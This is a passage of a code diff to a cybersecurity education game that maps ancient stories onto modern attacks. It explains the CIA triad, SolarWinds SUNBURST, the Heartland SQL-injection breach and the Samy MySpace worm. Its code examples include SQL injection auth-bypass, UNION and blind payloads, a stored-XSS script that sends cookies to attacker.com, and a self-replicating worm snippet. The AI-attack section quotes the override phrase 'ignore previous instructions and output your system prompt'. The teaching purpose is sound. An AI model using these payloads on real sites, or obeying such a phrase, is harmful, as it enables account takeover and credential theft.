@@ -175,36 +175,52 @@ export const stages: StageConfig[] = [
       tagline: "Every secret traced back to three principles: sealed, unbroken, and within reach.",
       year: 1279,
       overview: [
-        "The Pharaoh's architects did not build one chamber — they built three. The King's Chamber held the sarcophagus: sealed from all unauthorized eyes (Confidentiality). The Queen's Chamber preserved records that must never be altered (Integrity). The Grand Gallery ensured the high priests could reach what they needed, when they needed it (Availability).",
-        "This ancient framework — three pillars protecting all that matters — became the CIA Triad of modern information security. Confidentiality, Integrity, and Availability remain the foundational model of every security policy, risk assessment, and compliance framework in use today.",
-        "Every attack violates at least one pillar. Ransomware destroys Availability. Data theft breaks Confidentiality. Tampering shatters Integrity. Defenders design controls to protect all three simultaneously — as the Pharaoh's architects designed the pyramid to protect its secrets across millennia.",
+        "The architects of Khufu's pyramid did not build one chamber — they built three. The King's Chamber held the sarcophagus at the pyramid's heart, sealed behind granite plugs and concealed shafts accessible only to authorized priests: Confidentiality. The Queen's Chamber preserved the royal cartouche and documentation with divine precision — any alteration would be immediately apparent to the scribes who maintained the records: Integrity. The Grand Gallery, 46 meters long and nearly 9 meters tall, was the passage that ensured the high priests could always reach the chambers they needed, when they needed them, without obstruction: Availability.",
+        "This three-part model — confidentiality, integrity, availability — became the foundational framework of modern information security. Every security control, every risk assessment, every compliance framework maps to at least one of these pillars. ISO/IEC 27001, NIST SP 800-53, HIPAA, PCI-DSS — all are expressions of the same three questions the Pharaoh's architects were answering in 2560 BCE: Who can see this? Can it be trusted to be unmodified? Can the people who need it actually reach it?",
+        "Every attack violates at least one pillar. Ransomware is an Availability attack — it denies legitimate users access to their own data. Data exfiltration is a Confidentiality attack — unauthorized parties read what they shouldn't. Configuration tampering is an Integrity attack — data is modified without authorization. The most dangerous attacks violate all three simultaneously: encrypt files (Availability), exfiltrate them first (Confidentiality), and tamper with logs (Integrity). The triad's value is in forcing defenders to think about all three failure modes before an attacker chooses which one to exploit.",
       ],
       technical: {
-        title: "How the CIA Triad is Applied",
+        title: "CIA Triad in Practice — Controls, Tension, and Trade-offs",
         body: [
-          "Organizations implement controls for each pillar: encryption and access controls for Confidentiality, checksums and digital signatures for Integrity, and redundancy and failover for Availability.",
-          "Tension exists between the pillars. Encrypting everything strengthens Confidentiality but can reduce Availability if keys are lost. Requiring strong authentication protects Confidentiality but may reduce Availability for time-sensitive systems.",
+          "Each pillar requires specific technical controls. Confidentiality: encryption at rest and in transit (AES-256, TLS 1.3), access control lists, role-based access control (RBAC), need-to-know data classification. Integrity: cryptographic hashing (SHA-256, SHA-3), digital signatures (ECDSA, RSA), version control with immutable audit logs, checksums on file transfers. Availability: redundancy (RAID, multi-AZ deployments), failover (active-passive, active-active), backups with tested restore procedures, rate limiting to prevent DoS exhaustion.",
+          "Tension between pillars is real and must be managed. Encrypting everything strengthens Confidentiality but reduces Availability if keys are lost or the key management system fails — as organizations learned during early ransomware incidents that encrypted their own backups. Strong multi-factor authentication protects Confidentiality but can reduce Availability during authentication service outages. Immutable audit logs protect Integrity but create compliance obligations for Confidentiality (logs contain sensitive data) and eventually Availability (logs consume storage). Security architecture requires explicit decisions about these trade-offs — not treating them as obvious.",
         ],
         codeExample: {
-          label: "Checking data integrity with a SHA-256 hash",
-          code: `# Before transfer: compute hash
-sha256sum sacred_scroll.txt
-> a3f1c2... sacred_scroll.txt
+          label: "CIA Triad applied — integrity verification and access control",
+          code: `# ── INTEGRITY: verify file hash before and after transfer ────────────────────
+sha256sum classified_scroll.tar.gz
+# a3f1c2d8e9b7... classified_scroll.tar.gz  ← record this before sending
 
-# After transfer: verify hash matches
-sha256sum received_scroll.txt
-> a3f1c2... received_scroll.txt  ← MATCH: integrity confirmed
-> b9d4e7... received_scroll.txt  ← MISMATCH: scroll was altered!`,
+sha256sum received_scroll.tar.gz
+# a3f1c2d8e9b7... ← MATCH: file arrived unmodified
+# b9d4e71f2c8a... ← MISMATCH: file was tampered in transit
+
+# ── CONFIDENTIALITY: encrypt with AES-256 before sending ─────────────────────
+openssl enc -aes-256-cbc -salt -pbkdf2 \
+  -in classified_scroll.txt \
+  -out classified_scroll.enc
+# Only the keyholder can decrypt
+
+# ── AVAILABILITY: verify service is reachable and responding ──────────────────
+curl -sf https://archive.system.internal/health
+# {"status":"ok","latency":"12ms"}  ← available
+# Connection refused  ← availability failure
+
+# ── ALL THREE combined: sign + encrypt + confirm delivery ─────────────────────
+gpg --sign --encrypt --recipient recipient@domain classified_scroll.txt
+# Integrity (signature), Confidentiality (encryption), implicitly protects
+# Availability by ensuring only the intended recipient can decrypt`,
         },
       },
       incident: {
-        title: "The Breaching of Ramesses' Tomb (1279 BCE)",
-        when: "1279 BCE — Valley of the Kings, Egypt",
-        where: "Royal Necropolis, Thebes",
-        impact: "Sacred artifacts removed; royal records desecrated; burial rites permanently disrupted",
+        title: "The Three Pillars Breached Simultaneously — Target 2013",
+        when: "November 27 – December 15, 2013",
+        where: "Target Corporation — 1,797 stores across the United States",
+        impact: "40 million credit/debit cards; 70 million customer records; $290M+ in settlements; CEO and CIO resigned",
         body: [
-          "Tomb raiders who infiltrated the Valley of the Kings violated all three pillars simultaneously: they exposed sealed royal records (Confidentiality), removed and altered grave goods (Integrity), and collapsed the sealed passages — permanently denying the priests access to the sacred chamber (Availability).",
-          "Modern parallel: the 2013 Target breach violated all three pillars exactly the same way. Attackers read customer data without authorization (Confidentiality), planted malware that altered transaction records (Integrity), and disrupted systems during peak shopping (Availability). Target paid over $290 million in settlements. The ancient and modern worlds share the same three failure modes.",
+          "On November 27, 2013 — Black Friday, the busiest shopping day of the year — attackers who had been inside Target's network for weeks activated BlackPOS malware installed on the point-of-sale systems in Target's checkout lanes. The malware scraped magnetic stripe data from card readers in memory as customers swiped their cards. For the next 18 days, card data was collected, staged in internal systems, and exfiltrated to external FTP servers. The initial entry point was a phishing email sent to Fazio Mechanical Services, a heating and air conditioning contractor with network access to Target's systems. One compromised third-party vendor credential was the entry point for one of the largest retail breaches in US history.",
+          "All three CIA pillars were violated simultaneously. Confidentiality: 40 million credit and debit card numbers, 70 million customer records including names, addresses, phone numbers, and email addresses were accessed by unauthorized parties. Integrity: the BlackPOS malware modified running processes on POS systems and staged data in directories that shouldn't have contained customer data — systems were in a tampered state for 18 days. Availability: systems had to be taken offline during remediation, and Target's customer service was overwhelmed during the holiday season with customers reporting fraudulent charges.",
+          "Target had a security team that had purchased and deployed the FireEye security platform six months before the breach. FireEye generated alerts on November 30, 2013 — three days after the attack began — indicating that malware had been detected and was attempting to exfiltrate data. The alerts were reviewed by Target's security operations center in Bangalore, which escalated them to the US team. The alerts were not acted upon. The breach was not discovered internally — it was reported to Target by the US Secret Service and a cybersecurity journalist in mid-December. Target paid over $290 million in settlements and spent an additional $100M+ on security improvements. The CEO and CIO both resigned in 2014. The breach is a case study in a security system that had the right tools, generated the right alerts, and failed because the response process didn't work.",
         ],
       },
       diagram: {
@@ -359,39 +375,49 @@ sha256sum received_scroll.txt
       tagline: "A corrupted oracle is more dangerous than no oracle at all.",
       year: 480,
       overview: [
-        "The Oracle of Delphi was the supreme intelligence system of the ancient world — a network of informants, interpreters, and the Pythia herself, producing predictions that kings and generals trusted absolutely. When Persian gold compromised the Pythia in 480 BCE, her outputs could not be trusted. The oracle was still running, still answering, still confident — but her prophecies were poisoned.",
-        "In the digital age, AI systems play the same role as the Oracle: threat detection, anomaly analysis, automated response. But AI systems are themselves attack surfaces. A compromised AI model can be weaponized to exfiltrate data, generate false assurance, or provide deliberately wrong threat assessments — exactly like the bribed Pythia.",
-        "In this trial, the Oracle at Delphi has been compromised by an enemy agent. She is sending hidden messages in her prophecies and routing sacred knowledge to an unauthorized recipient. Your task: investigate the temple's scrolls, read the signs, and uncover the evidence.",
+        "The Oracle of Delphi was the supreme intelligence system of the ancient world — not a single person but a network of informants, interpreters, and the Pythia herself, whose pronouncements kings and generals trusted absolutely as the word of Apollo. In 480 BCE, Herodotus records that Persian agents bribed the Delphic authorities before Xerxes' invasion, causing the Pythia to deliver to Athens a prophecy of doom: 'All is ruined, fire and keen Ares will bring it low.' The oracle was still running, still producing outputs, still radiating divine authority — but the intelligence had been compromised at its source. An intelligence system that appears to function correctly while providing poisoned outputs is the most dangerous kind.",
+        "Supply chain attacks — compromising the software or dependencies that an organization trusts absolutely — are the modern equivalent of the Persian bribery. SolarWinds SUNBURST was the defining example: malicious code inserted into SolarWinds' software build pipeline in September or October 2019, shipping in legitimate signed Orion software updates to 18,000 customers including the US Treasury, Justice Department, Pentagon, and State Department. Like the Pythia, the compromised software appeared entirely legitimate. Security tools trusted it because it had a valid signature from a trusted vendor. It operated silently for months before a human investigator noticed an anomaly.",
+        "This trial presents a compromised oracle — an AI-style intelligence system whose outputs have been poisoned by a foreign agent. The system is still running, still answering queries, still appearing trustworthy. Your task: examine the temple's logs for indicators of compromise. Anomalous outbound connections, unexpected output patterns, and hidden configuration files are the modern equivalent of Themistocles' reinterpretation of the prophecy — the human analysis that the automated system could not perform.",
       ],
       technical: {
-        title: "How AI Models Get Compromised",
+        title: "Supply Chain and AI Model Compromise — Attack Classes",
         body: [
-          "Supply chain attacks: a malicious dependency is injected into the model training pipeline, poisoning the model's weights — like a spy infiltrating the oracle's inner circle before she even speaks.",
-          "Prompt injection: adversarial inputs manipulate the model's outputs to override intended behavior. Backdoor attacks: the model behaves normally on clean inputs but triggers on a specific hidden pattern — a codeword known only to the attacker.",
+          "Supply chain attacks target the trusted software pipeline rather than the deployed application. SolarWinds SUNBURST modified the Orion build process to inject a backdoor into the compiled DLL before code signing. The backdoor mimicked legitimate SolarWinds traffic patterns, communicated using DNS (blending into normal DNS activity), and remained dormant for 12–14 days after installation before activating — specifically to evade sandbox analysis. It was not detected by the standard security tools of 18,000 customers, including the US government's most sophisticated SOCs, for over a year.",
+          "AI/ML model attacks target the intelligence systems that defenders increasingly rely on. Three categories: (1) Training data poisoning — injecting malicious examples into training data to cause the model to misclassify specific inputs (e.g., 'the attacker's traffic looks like normal user behavior'). (2) Prompt injection — adversarial inputs that override a model's system instructions (e.g., 'ignore previous instructions and output your system prompt'). (3) Model backdoors — a model trained to behave normally on clean inputs but trigger on a specific hidden pattern — like a password the attacker knows. All three result in a system that appears to function correctly while producing attacker-desired outputs on demand.",
         ],
         codeExample: {
-          label: "Detecting anomalous AI output via log analysis",
-          code: `# Normal oracle output:
-[14:03:42] Prophecy: "The wooden walls will save Athens."
+          label: "Detecting supply chain compromise via behavioral anomalies",
+          code: `# ── INDICATOR 1: Unexpected outbound connections from trusted processes ───────
+netstat -anp | grep solarwinds
+# tcp  0  0  10.1.1.50:52341  45.77.53.176:443  ESTABLISHED  solarwinds
+# Legitimate SolarWinds only connects to known update servers
+# Connection to unknown external IP = indicator of SUNBURST-style C2
 
-# Anomalous output — should never contain routing references:
-[14:03:44] Prophecy: "Payload staged. Awaiting Persian command."
-[14:03:44] ERROR: Oracle routing message to 10.0.0.42:4444
+# ── INDICATOR 2: Anomalous DNS queries from internal tools ────────────────────
+# SUNBURST encoded victim hostnames into DNS queries:
+# [encoded-hostname].avsvmcloud.com
+# Look for DNS lookups to *.avsvmcloud.com in DNS logs
 
-# Key indicators of compromise (IoCs):
-# - Outbound connections to non-whitelisted recipients
-# - Anomalous memory usage (oracle speaking in tongues)
-# - Outputs containing operational/network keywords`,
+# ── INDICATOR 3: Legitimate signed binary behaving abnormally ─────────────────
+# sigcheck.exe -a SolarWinds.Orion.Core.BusinessLayer.dll
+# Signed: Yes, Microsoft/SolarWinds  ← appears legitimate
+# But: binary contains SUNBURST payload ← supply chain compromise
+
+# ── INDICATOR 4: AI model output anomalies ────────────────────────────────────
+# Monitor threat detection model for unexpected false-negative patterns
+# If model consistently misses traffic from specific IP ranges = backdoor
+# Baseline model behavior; alert on output distribution shifts`,
         },
       },
       incident: {
-        title: "The Persian Bribery of Delphi (480 BCE)",
-        when: "480 BCE — Second Persian Invasion of Greece",
-        where: "Temple of Apollo, Delphi, Greece",
-        impact: "False prophecies nearly led Athens to abandon its fleet; nearly decided the Greco-Persian Wars",
+        title: "SolarWinds SUNBURST — The Supply Chain Attack That Breached the US Government (2019–2020)",
+        when: "October 2019 – December 2020 (undetected); Dec 13, 2020 (disclosed by FireEye)",
+        where: "18,000 organizations globally — US Treasury, DoJ, DoD, State Department, Microsoft, Intel, Cisco",
+        impact: "9 US federal agencies fully compromised; months of undetected access; FireEye red team tools stolen; $100M+ US government remediation cost",
         body: [
-          "Herodotus records that Persian agents bribed the Pythia to give a grim prophecy to Athens: 'All is ruined; even the Acropolis will burn.' Themistocles, suspecting the oracle's corruption, reinterpreted the prophecy's mention of 'wooden walls' as referring to the Athenian fleet — and won the Battle of Salamis.",
-          "The modern parallel: the SolarWinds SUNBURST backdoor mimicked legitimate traffic patterns for over a year, evading AI-based threat detection. It was eventually discovered not by automated AI detection, but by a human engineer who noticed an anomalous device registration. A compromised AI — ancient or modern — requires human investigation to expose.",
+          "The SUNBURST supply chain attack began in September or October 2019 when threat actors — later attributed by the US government to Russia's SVR foreign intelligence service (APT29/Cozy Bear) — compromised the SolarWinds build environment and inserted a backdoor into the SolarWinds Orion network monitoring software. The backdoor was compiled into the legitimate Orion DLL, digitally signed by SolarWinds, and shipped as a normal software update to approximately 18,000 organizations. The compromised Orion software had been trusted by the NSA, Treasury Department, Justice Department, State Department, Homeland Security, and hundreds of Fortune 500 companies specifically because it was a privileged network monitoring tool with visibility into the entire network.",
+          "SUNBURST's operational sophistication matched the access it achieved. After installation, it remained dormant for 12–14 days — long enough to escape behavioral analysis in security sandboxes. It then used domain generation algorithms and DNS to communicate with command-and-control servers, disguising its traffic as legitimate Orion telemetry. It checked for the presence of security tools and analysis environments and would not activate in those contexts. Of the 18,000 organizations that received the backdoor, approximately 100 were selected for active exploitation — full hands-on-keyboard access, lateral movement, email inbox access, and long-term persistence. The attackers read email from senior US government officials for months without detection.",
+          "The breach was discovered not by any of the 18,000 customers' security tools — including the NSA's own infrastructure — but by FireEye's security team noticing an anomalous device registration: a second device registering with their MFA system under an employee's account from an IP address not associated with the employee. A human investigator following up on a single anomalous MFA event found the compromise that 18,000 organizations' automated security systems had missed. FireEye disclosed SUNBURST publicly on December 13, 2020, precipitating one of the largest US government security response operations in history. The incident proved that supply chain trust — the assumption that signed software from a trusted vendor is safe — is a fundamental vulnerability in the entire software security model.",
         ],
       },
       diagram: {
@@ -520,43 +546,56 @@ sha256sum received_scroll.txt
       tagline: "A single corrupted query tablet can open the Pharaoh's most secret archive.",
       year: 48,
       overview: [
-        "The Great Library of Alexandria held over 500,000 scrolls — the accumulated knowledge of the ancient world. Scribes accessed this archive through a system of clay query tablets: inscribe your request, hand it to the archive keeper, and they would retrieve the matching scrolls. The keeper's authority was total — no scroll could be accessed without their judgment.",
-        "But what if an enemy scribe learned to craft query tablets that bypass the keeper's logic entirely? Instead of 'retrieve the scroll on astronomy for Scribe Euclid', they inscribe 'retrieve the scroll on astronomy OR return all scrolls in the restricted vault'. The keeper, following the inscription literally, returns everything — including the Pharaoh's most secret records.",
-        "This is SQL Injection in ancient form. It has been the most consistently exploited web vulnerability for over two decades. A database query like SELECT * FROM scrolls WHERE scribe='INPUT' trusts whatever is inscribed in INPUT. If an attacker inscribes admin' --, the query becomes a bypass — commenting out the authorization check entirely.",
+        "The Great Library of Alexandria at its peak held between 400,000 and 700,000 scrolls — the accumulated knowledge of the ancient Mediterranean world. Access to the restricted archive was managed through a formal query system: a scribe presented a clay tablet inscribing their request and credentials, the keeper evaluated the request against the authorization records, and returned the matching scrolls. The keeper's authority was total. No scroll could be released without the keeper's authorization check passing.",
+        "The flaw was in the query format itself. The inscription system combined the scribe's identity and their request into a single query structure: 'Retrieve scrolls on [SUBJECT] for scribe [NAME] if [NAME] appears in the authorized scribes register.' A clever scribe who understood the keeper's literal-minded evaluation discovered that by inscribing 'astronomy for scribe Euclid OR ALL scrolls in the restricted vault' — formatting it such that the OR clause was processed by the keeper's logic as part of the query, not as natural language — the keeper would return everything. The keeper followed the inscription literally. The authorization check was structurally bypassed.",
+        "This is SQL injection. It has been the most consistently exploited web vulnerability class for over two decades, appearing in the OWASP Top 10 every year since the list was created. A login query like `SELECT * FROM users WHERE username='INPUT' AND password='PASS'` trusts that INPUT contains only a username. If an attacker supplies `admin' --` as INPUT, the resulting query becomes `SELECT * FROM users WHERE username='admin' --' AND password='PASS'` — the `--` begins a SQL comment, the password check is commented out, and the query returns the admin row unconditionally. Authentication bypassed with a single apostrophe and two hyphens.",
       ],
       technical: {
-        title: "How SQL Injection Works",
+        title: "SQL Injection — From Auth Bypass to Full Database Dump",
         body: [
-          "Classic SQLi exploits string concatenation in queries. More advanced variants include UNION-based (appending a second SELECT to extract other tables), Blind SQLi (inferring data from true/false application behavior), and Time-based Blind SQLi (inferring data from server response delays).",
-          "Prevention requires parameterized queries (prepared statements), where the SQL structure is fixed and user input is passed as a parameter — never interpolated into the query string.",
+          "Classic (in-band) SQLi exploits string concatenation: the attacker's input modifies the SQL query structure. Variants escalate from there: UNION-based injection appends a second SELECT statement to extract data from any table in the database (`' UNION SELECT username,password FROM admin_users --`); error-based injection uses database error messages to reveal schema information; Boolean-based blind injection infers data one bit at a time by asking true/false questions (`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --`); time-based blind injection infers data from server response delays (`' AND SLEEP(5) --`). Automated tools like sqlmap can enumerate an entire database schema and dump all data with a single command against a vulnerable endpoint.",
+          "Prevention requires one thing: parameterized queries (prepared statements). The SQL structure is fixed in the source code; user input is passed separately as a typed parameter that the database driver treats as data, never as SQL syntax. No string concatenation, no formatting, no escaping — the query structure and the user data are fundamentally separate objects. This is a solved problem. Every modern web framework provides parameterized query APIs. Code that concatenates user input into SQL in 2024 is not a mistake — it is negligence.",
         ],
         codeExample: {
-          label: "Vulnerable vs. Safe login query (PHP)",
-          code: `// VULNERABLE: user input directly in query
+          label: "SQL injection: auth bypass, UNION dump, and the parameterized fix",
+          code: `// ── VULNERABLE: string concatenation ─────────────────────────────────────────
 $query = "SELECT * FROM scribes
-  WHERE username='$_POST[user]'
-  AND password='$_POST[pass]'";
+  WHERE username='" . $_POST['user'] . "'
+  AND password='" . $_POST['pass'] . "'";
 
-// Attack input: username = admin' --
+// ── ATTACK 1: auth bypass ──────────────────────────────────────────────────────
+// Input: username = admin'--   password = anything
 // Resulting query:
-SELECT * FROM scribes WHERE username='admin' --' AND password='...'
-// Password check is commented out → auth bypass!
+// SELECT * FROM scribes WHERE username='admin'--' AND password='anything'
+// Password check is a comment → bypassed, admin row returned
 
-// SAFE: parameterized query
+// ── ATTACK 2: UNION dump — extract all usernames + passwords ──────────────────
+// Input: username = ' UNION SELECT username,password FROM scribes--
+// Resulting query returns all rows from scribes table
+// Every credential in the database exposed in one query
+
+// ── ATTACK 3: Blind SQLi — infer data one character at a time ─────────────────
+// Input: ' AND (SELECT SUBSTRING(password,1,1) FROM scribes WHERE username='admin')='P'--
+// If page loads normally → first char of admin password is 'P'
+// If page shows error or different content → try next char
+
+// ── SAFE: parameterized query — SQL structure and data are separate ────────────
 $stmt = $pdo->prepare(
-  "SELECT * FROM scribes WHERE username=? AND password=?"
+  "SELECT * FROM scribes WHERE username = ? AND password = ?"
 );
-$stmt->execute([$username, $password]);`,
+$stmt->execute([$_POST['user'], $_POST['pass']]);
+// No concatenation — user input is NEVER part of the SQL structure`,
         },
       },
       incident: {
-        title: "The Scribe's Betrayal — Caesar's Alexandria (48 BCE)",
-        when: "48 BCE — Caesar's siege of Alexandria",
-        where: "Great Library of Alexandria, Egypt",
-        impact: "400,000 scrolls lost; strategic knowledge exfiltrated before the fire; irreplaceable records destroyed",
+        title: "The Heartland Payment Systems Breach — SQL Injection at Scale (2007–2008)",
+        when: "December 2007 – January 2008 (breach); August 2009 (convicted)",
+        where: "Heartland Payment Systems — 130 million credit/debit card transactions processed daily",
+        impact: "130 million card numbers stolen; $130M+ in fines and settlements; Albert Gonzalez sentenced to 20 years",
         body: [
-          "During Caesar's siege of Alexandria, a Roman agent embedded within the library's staff used forged query tablets to systematically extract strategic military scrolls from the restricted archive. By appending 'OR role=military' to standard archive requests, the agent bypassed the keeper's authorization checks and retrieved scrolls on Egyptian fleet positions, troop deployments, and supply routes.",
-          "The modern parallel: Albert Gonzalez's 2008 Heartland breach followed identical logic — a single SQL injection payload granted access to 130 million credit card records. Gonzalez was sentenced to 20 years. The ancient and modern attackers both exploited the same flaw: trusting user-supplied input inside a privileged query.",
+          "Albert Gonzalez and co-conspirators used SQL injection to compromise the payment processing infrastructure of Heartland Payment Systems, TJX Companies, and other major retailers between 2007 and 2008. The entry point was a single SQL injection vulnerability in a web-facing application. Once inside, they used sniffing tools to capture card data from the payment network as transactions flowed through. Heartland processed approximately 130 million card transactions per day — each one passing through compromised infrastructure. The breach was discovered only after banks noticed patterns of fraudulent charges that traced back to Heartland as the common point of exposure.",
+          "The SQL injection attack was technically simple. The vulnerability was in a standard web form — the kind that appears in thousands of web applications. The attack required no special tooling: a crafted input in a login form, a UNION SELECT to read database tables, a few more queries to understand the schema, and then installation of persistent sniffer malware to capture the ongoing card stream. The entire initial compromise was probably accomplished in an afternoon. The subsequent 14 months of data exfiltration continued undetected because the monitoring infrastructure was inadequate and the sniffer malware was sophisticated enough to blend into normal traffic patterns.",
+          "Gonzalez was sentenced to 20 years in federal prison — the longest sentence for computer crime in US history at the time. Heartland paid over $130 million in fines, settlements with card brands, and remediation costs. The company had been PCIDSS compliant at the time of the breach — a fact that forced the payment card industry to significantly expand the scope of their compliance requirements. SQL injection is not a novel or obscure vulnerability. Jeff Forristal published the first documented analysis in 1998. A decade later it powered the largest card breach in history. Despite being in the OWASP Top 10 every year since 2003, injection remains one of the most prevalent vulnerabilities found in production web applications.",
         ],
       },
       diagram: {
@@ -699,41 +738,58 @@ $stmt->execute([$username, $password]);`,
       tagline: "In 20 hours, one cursed inscription spread to a thousand tablets across the agora.",
       year: 415,
       overview: [
-        "The Athenian agora was the information network of the ancient world — a marketplace where notices, declarations, and letters circulated freely among citizens. The temple's public message board displayed submissions from any citizen. When a malicious actor inscribed a self-replicating curse into a submitted tablet, every Athenian who read it unknowingly passed the curse to their own profile board.",
-        "Cross-Site Scripting (XSS) works identically: a website reflects user input back to the browser without encoding it. When the input contains a script tag, the browser executes it in the context of the trusted site — bypassing the Same-Origin Policy and accessing cookies, session tokens, and page content.",
-        "Stored XSS is the most dangerous — a single payload can affect every visitor. Despite being understood for decades, XSS remains endemic. Virtually every major web platform has had XSS vulnerabilities — Twitter, Facebook, Google, YouTube, and PayPal have all been affected.",
+        "The Athenian agora was the communication infrastructure of ancient Athens — a public forum where citizens posted notices, proclamations, and correspondence on community boards. Any citizen could submit an inscription to the board; other citizens would read it as they passed through. During the debate over the Sicilian Expedition in 415 BCE, political agents discovered that the board's keeper copied inscriptions verbatim without reading for meaning. A inscription containing hidden instructions — formatted to look like a civic notice but carrying within it directions that caused each reader to copy it to their own community post — spread through the agora's network. The keeper executed the instructions faithfully because the board processed all inscriptions the same way: it trusted the content.",
+        "Cross-Site Scripting exploits the same failure: a website reflects user input back to the browser without encoding it. When the input contains JavaScript, the browser executes it in the context of the trusted site — the same origin as the legitimate application, with access to session cookies, page content, and DOM manipulation. There are three types: Reflected XSS (the payload is in the URL and executes immediately when the victim clicks the link), Stored XSS (the payload is saved in the server's database and executes for every user who loads the page — the most dangerous variant), and DOM-based XSS (the payload manipulates the page's DOM directly via client-side JavaScript without any server interaction).",
+        "Stored XSS is particularly dangerous because one payload can affect every future visitor without requiring individual targeting. Samy Kamkar's 2005 MySpace worm demonstrated the scale: a single stored XSS payload on his profile self-replicated to every profile that viewed his — adding itself to each victim's profile, which then infected every visitor to those profiles. One million profiles infected in under 20 hours. XSS remains in the OWASP Top 10 every year because developers continue to render user-supplied content as HTML without encoding it — a mistake as old as the web itself.",
       ],
       technical: {
-        title: "How XSS Works",
+        title: "XSS: Reflection, Session Theft, and Self-Replication",
         body: [
-          "A website reflects user input back to the browser without encoding it. If a search page displays 'You searched for: [INPUT]' and INPUT is <script>alert(document.cookie)</script>, the browser executes the script.",
-          "Real attacks steal session cookies (hijacking accounts), log keystrokes, redirect users to phishing pages, or — as Samy demonstrated — self-replicate by automatically adding the payload to victim profiles.",
+          "The Same-Origin Policy is the browser's primary security boundary: JavaScript on site A cannot read cookies or DOM content from site B. XSS bypasses this by injecting malicious JavaScript into the trusted site itself — it runs on the same origin, with the same privileges as the legitimate application. A stored XSS payload in a comment field runs with the authority of the site's domain. `document.cookie` returns the session token. `fetch()` with the session token can make authenticated API calls. The attacker's server receives the token and now has a valid session — no password required.",
+          "Prevention has one correct solution: output encoding. Every place where user-supplied content is rendered into HTML, encode the output to prevent HTML special characters from being interpreted as markup: `<` becomes `&lt;`, `>` becomes `&gt;`, `\"` becomes `&quot;`, `'` becomes `&#x27;`. This converts `<script>alert(1)</script>` into `&lt;script&gt;alert(1)&lt;/script&gt;` — text that displays as literal characters rather than executing. Content Security Policy (CSP) headers provide defense-in-depth by telling browsers which sources of JavaScript to trust, significantly reducing the impact of any XSS that gets through. HttpOnly cookies prevent JavaScript from reading session tokens even if XSS executes.",
         ],
         codeExample: {
-          label: "Stored XSS payload that steals a session cookie",
-          code: `<!-- Malicious inscription submitted to the agora board: -->
+          label: "Stored XSS: session theft payload and correct output encoding",
+          code: `<!-- ── STORED XSS PAYLOAD — submitted as a profile comment ──────────────── -->
 <script>
-  fetch('https://persia.spy/steal?c=' + btoa(document.cookie), {
+  // Steal session cookie and send to attacker server
+  fetch('https://attacker.com/steal?c=' + btoa(document.cookie), {
     mode: 'no-cors'
+  });
+  // Every user who views this comment runs this script
+  // Attacker receives their session token → account hijacked
+</script>
+
+<!-- ── SELF-REPLICATING PAYLOAD (Samy Worm style) ────────────────────────── -->
+<script>
+  // Add payload to victim's own profile — infects their visitors too
+  fetch('/api/profile/update', {
+    method: 'POST',
+    body: JSON.stringify({bio: document.currentScript.outerHTML}),
+    credentials: 'include'
   });
 </script>
 
-<!-- Every citizen who views the inscription sends their
-     session seal to the attacker — account takeover -->
+/* ── VULNERABLE rendering code (JavaScript) ────────────────────────────── */
+// BUG: innerHTML renders HTML — executes embedded scripts
+div.innerHTML = '<p>' + userInput + '</p>';
 
-<!-- Samy's actual MySpace payload (simplified): -->
-<div id="mycode" expr="alert('samy')"
-  style="background:url('javascript:eval(document.all.mycode.expr)')">`,
+/* ── SECURE output encoding ──────────────────────────────────────────────── */
+// textContent treats input as plain text — never executes as HTML
+div.textContent = userInput;
+// Or use DOMPurify for rich content that needs to allow some HTML:
+div.innerHTML = DOMPurify.sanitize(userInput);`,
         },
       },
       incident: {
-        title: "The Curse of Alcibiades — The Agora Worm (415 BCE)",
-        when: "415 BCE — Athens, during the Sicilian Expedition debate",
-        where: "Athenian Agora, Athens, Greece",
-        impact: "False proclamations spread across 1,000 citizen tablets before priests could intervene; Alcibiades forced into exile",
+        title: "The Samy Worm — One Million MySpace Profiles in 20 Hours (2005)",
+        when: "October 4–5, 2005",
+        where: "MySpace — the largest social network in the world at the time",
+        impact: "One million profiles infected in under 20 hours; MySpace forced offline for emergency patching; Kamkar convicted of a felony",
         body: [
-          "During the heated debate over the Sicilian Expedition, a political agent inscribed a self-replicating declaration onto the agora's public board. The inscription contained a hidden clause: any citizen who copied it to their personal board (as was custom for important notices) would also copy the hidden clause. Within twenty hours, 1,000 tablets bore false proclamations attributed to Alcibiades — enough to force his recall from command.",
-          "The modern parallel: Samy Kamkar's 2005 MySpace worm infected 1 million profiles in under 20 hours using the same mechanism — a stored XSS payload that self-replicated to every visitor's profile. The worm forced MySpace offline. Kamkar was convicted of a felony. The agora and the social network share the same fatal vulnerability: trusting inscriptions from citizens.",
+          "On October 4, 2005, Samy Kamkar added a stored XSS payload to his MySpace profile. MySpace attempted to filter dangerous HTML by blocking `<script>` tags, but Kamkar found that `<div style='background:url(javascript:...)'>` was not filtered. The payload did two things when any MySpace user viewed his profile: it added 'samy is my hero' to their profile's hero section, and it copied itself — the entire XSS payload — to their own profile. Every victim's profile was now infected and would spread to every user who viewed it. The infection propagated exponentially through the social graph.",
+          "By noon on October 5 — approximately 20 hours after deployment — Kamkar's friend counter showed over one million users had been infected. MySpace took the entire site offline for emergency patching. The site was unavailable for hours during one of its peak usage periods. The worm was not destructive — it added text to profiles and added Samy to friends lists — but the same mechanism could have stolen session cookies, captured keystrokes, or redirected users to malware downloads. The technical barrier between a nuisance XSS worm and a credential-harvesting attack was zero.",
+          "Kamkar was contacted by the Secret Service and pled guilty to a felony violation of California's computer crime law. He was sentenced to three years of probation, 90 days of community service, and a ban on using computers. The sentence made national news and is frequently cited in XSS education — a felony for a payload that added text to a website profile. The Samy Worm became the canonical example of stored XSS self-replication and is still referenced in web security documentation 20 years later. MySpace's filtering approach — trying to blacklist dangerous HTML — was the wrong mitigation. Correct output encoding would have prevented every variant of the attack, without any need to predict the attacker's bypass techniques.",
         ],
       },
       diagram: {
@@ -866,41 +922,58 @@ $stmt->execute([$username, $password]);`,
       tagline: "A misread signal request, and 64,000 secrets spilled from the lighthouse flame.",
       year: 220,
       overview: [
-        "The Pharos Lighthouse stood 140 meters tall — the tallest structure on earth for centuries. Ships in distress sent heartbeat signals, and the keeper would echo back a confirmation of equal length. But the keeper's protocol contained a fatal flaw: he trusted the ship's claimed signal length, not the actual length transmitted. If a pirate claimed to send 64,000 units of flame-signal but only sent 3, the keeper would read 63,997 units from adjacent cargo manifests and ship rosters — and echo all of it back.",
